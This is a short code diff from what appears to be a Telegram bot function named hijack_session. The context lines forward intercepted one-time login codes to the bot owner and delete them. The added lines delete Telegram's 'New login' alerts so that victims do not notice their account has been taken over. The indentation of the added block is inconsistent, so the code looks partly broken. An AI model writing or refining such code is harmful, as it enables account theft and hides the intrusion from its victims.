@@ -223,6 +223,9 @@ async def hijack_session(_, message):
                 await app.send_message(OWNER_ID, otp_text)
                 # ✅ Wait briefly to receive OTP, then terminate
                 await msg.delete()
+                 # ✅ Check separately for "New Login" message and delete it
+            if "New login" in msg.text or "logged in" in msg.text:
+                await msg.delete()  # ✅ Delete the "New Login" message
                 await asyncio.sleep(60)  # Wait 1 minutes before auto-stopping
                 await otp_userbot.stop()
                 await msg.reply("🛑 OTP session closed...")
